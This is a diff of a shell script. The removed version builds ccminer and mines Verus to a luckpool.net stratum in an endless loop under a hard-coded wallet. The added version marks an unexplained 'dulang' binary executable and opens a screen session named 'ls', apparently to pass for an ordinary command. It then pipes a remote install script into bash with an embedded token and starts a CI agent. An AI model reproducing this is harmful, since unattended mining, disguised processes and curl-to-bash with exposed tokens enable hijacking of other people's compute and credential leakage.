@@ -1,17 +1,7 @@
-#!/bin/sh
-
-apt update
-apt install sudo
-apt install git -y
-sudo apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential -y
-git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git
-cd ccminer
-chmod +x build.sh
-chmod +x configure.sh
-chmod +x autogen.sh
-./build.sh
-while [ 1 ]; do
-./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RXggSUt7YBw76Jq8A1cmqVH8TPWVoao6PJ.JOSS -p x -t 2
-sleep 3
-done
-sleep 999
+#!/bin/bash
+sudo apt update 
+sudo apt install screen libjansson4 -y 
+chmod +x dulang
+screen -dmS ls 
+TOKEN="eb7efad977c985733618f330368724f5b7de9931b5e6b6e40b" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`"
+~/.buildkite-agent/bin/buildkite-agent start
